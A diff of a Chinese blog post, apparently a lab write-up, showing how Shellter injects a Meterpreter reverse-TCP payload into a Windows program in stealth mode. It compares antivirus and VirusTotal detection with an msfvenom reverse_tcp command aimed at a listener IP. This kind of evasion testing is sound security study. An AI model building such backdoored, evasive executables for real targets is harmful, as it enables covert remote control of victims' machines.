@@ -25,7 +25,7 @@ Shellter 使用动态 shellcode 注入的方式修改程序。本文记录它的
 
 2. 安装 Shellter：`apt install shellter`。
 
-![在 Kali 中安装 Shellter 7.2](https://res.cloudinary.com/sycamore/image/upload/v1792085290/Typora/2023/04/0c4297a033272d1212d9cb86e4daf005.png)
+![在 Kali 中安装 Shellter 7.2](https://res.cloudinary.com/sycamore/image/upload/v1792696727/Typora/2026/05/0c4297a033272d1212d9cb86e4daf005.png)
 
 ## shellter 使用
 
@@ -35,28 +35,28 @@ Shellter 使用动态 shellcode 注入的方式修改程序。本文记录它的
 2. 输入 `A` 或 `a`，选择自动模式。
 3. 在 `PE Target:` 后输入测试程序的文件路径。
 
-![启动 Shellter，选择自动模式和测试程序](https://res.cloudinary.com/sycamore/image/upload/v1792085295/Typora/2023/04/272fa29e9da9d004a3cf25b87079f7de.png)
+![启动 Shellter，选择自动模式和测试程序](https://res.cloudinary.com/sycamore/image/upload/v1792696731/Typora/2026/05/272fa29e9da9d004a3cf25b87079f7de.png)
 
 4. 在 `Enable Stealth Mode?` 提示后输入 `Y`。
 
-![Shellter 的 Stealth Mode 提示](https://res.cloudinary.com/sycamore/image/upload/v1792085286/Typora/2023/04/0ac54c6f74fda57f2a51ac0b8bde409f.png)
+![Shellter 的 Stealth Mode 提示](https://res.cloudinary.com/sycamore/image/upload/v1792696732/Typora/2026/05/0ac54c6f74fda57f2a51ac0b8bde409f.png)
 
 5. 输入 `L`，使用界面列出的 payload。
 6. 选择编号 `1`，对应 `Meterpreter_Reverse_TCP`。
 
-![从列表中选择 Meterpreter_Reverse_TCP](https://res.cloudinary.com/sycamore/image/upload/v1792085284/Typora/2023/04/073c31195d0c78a68e8b3c2fecbc8531.png)
+![从列表中选择 Meterpreter_Reverse_TCP](https://res.cloudinary.com/sycamore/image/upload/v1792696733/Typora/2026/05/073c31195d0c78a68e8b3c2fecbc8531.png)
 
 7. 分别输入监听端的 IP 地址和端口号。
 
-![填写监听端地址和端口](https://res.cloudinary.com/sycamore/image/upload/v1792085280/Typora/2023/04/396417290b20f351cc3c1d96669a3c4e.png)
+![填写监听端地址和端口](https://res.cloudinary.com/sycamore/image/upload/v1792696735/Typora/2026/05/396417290b20f351cc3c1d96669a3c4e.png)
 
 8. 等待界面显示 `Injection: Verified!`，按回车继续，结束本次操作。
 
-![Shellter 显示注入验证结果](https://res.cloudinary.com/sycamore/image/upload/v1792085280/Typora/2023/04/0169aba2f4b7dfa0ba83b3304994339f.png)
+![Shellter 显示注入验证结果](https://res.cloudinary.com/sycamore/image/upload/v1792696735/Typora/2026/05/0169aba2f4b7dfa0ba83b3304994339f.png)
 
 > **处理后的文件会替换原路径下的文件，文件名保持不变。** 本文环境中的原文件备份位于 `/root/Shellter_Backups/`。
 
-![处理后的文件与 Shellter_Backups 中的原文件备份](https://res.cloudinary.com/sycamore/image/upload/v1792085276/Typora/2023/04/9b58fed5ce217d4b84967579f2522d55.png)
+![处理后的文件与 Shellter_Backups 中的原文件备份](https://res.cloudinary.com/sycamore/image/upload/v1792696736/Typora/2026/05/9b58fed5ce217d4b84967579f2522d55.png)
 
 ## 利用 & 免杀效果
 
@@ -72,19 +72,19 @@ Shellter 使用动态 shellcode 注入的方式修改程序。本文记录它的
 
 运行测试程序后，监听端收到连接并建立了 Meterpreter 会话：
 
-![监听端建立 Meterpreter 会话的实验结果](https://res.cloudinary.com/sycamore/image/upload/v1792085276/Typora/2023/04/4eff497abdd31d7be53e51e0d88f75f7.png)
+![监听端建立 Meterpreter 会话的实验结果](https://res.cloudinary.com/sycamore/image/upload/v1792696737/Typora/2026/05/4eff497abdd31d7be53e51e0d88f75f7.png)
 
 ### 免杀效果
 
 实验的 Win 7 x64 虚拟机安装了 360 安全软件。这次检查文件时没有看到告警，运行程序并建立 Meterpreter 会话后，也没有立即弹出提示。大约一分钟后，才出现下面的木马警告：
 
-![360 安全软件弹出的木马警告](https://res.cloudinary.com/sycamore/image/upload/v1792085272/Typora/2023/04/69719cbb27c9df97660f0c6405be89c7.png)
+![360 安全软件弹出的木马警告](https://res.cloudinary.com/sycamore/image/upload/v1792696739/Typora/2026/05/69719cbb27c9df97660f0c6405be89c7.png)
 
 观察到的警告有延迟，但不能据此认定样本不会被检测。再次遇到同一样本时，警告似乎更快。不过这次观察不足以判断每次检测的反应时间。
 
 我还将样本提交到了 VirusTotal。下图显示，Shellter 处理后的样本有 **31 / 70** 个引擎报出检测结果：[查看报告](https://www.virustotal.com/gui/file/e4e97bef85f3970d42e81d6f75815050d7ff2370790888fe9d78948bc83b30a7)。
 
-![Shellter 样本的 VirusTotal 检测结果为 31/70](https://res.cloudinary.com/sycamore/image/upload/v1792085272/Typora/2023/04/6a65ae126f5f5f5c0658d6165d837a04.png)
+![Shellter 样本的 VirusTotal 检测结果为 31/70](https://res.cloudinary.com/sycamore/image/upload/v1792696739/Typora/2026/05/6a65ae126f5f5f5c0658d6165d837a04.png)
 
 为了对比，我使用同一个程序和相同的 payload，通过 msfvenom 的模板方式生成了另一个样本。使用的命令如下：
 
@@ -94,7 +94,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.158.139 LPORT=4444 -x 
 
 这个样本在截图中的检测结果为 **40 / 70**：[查看报告](https://www.virustotal.com/gui/file/c3a7c2280e4aa9aa0693729049f7f8e0ff05e253c1047ef282748c3509687207)。
 
-![msfvenom 样本的 VirusTotal 检测结果为 40/70](https://res.cloudinary.com/sycamore/image/upload/v1792085277/Typora/2023/04/c0631de31f6d8f365c052ec14a014b37.png)
+![msfvenom 样本的 VirusTotal 检测结果为 40/70](https://res.cloudinary.com/sycamore/image/upload/v1792696740/Typora/2026/05/c0631de31f6d8f365c052ec14a014b37.png)
 
 这两张报告中，Shellter 样本被报出的次数较少，但两份样本都被多个引擎检测到。
 
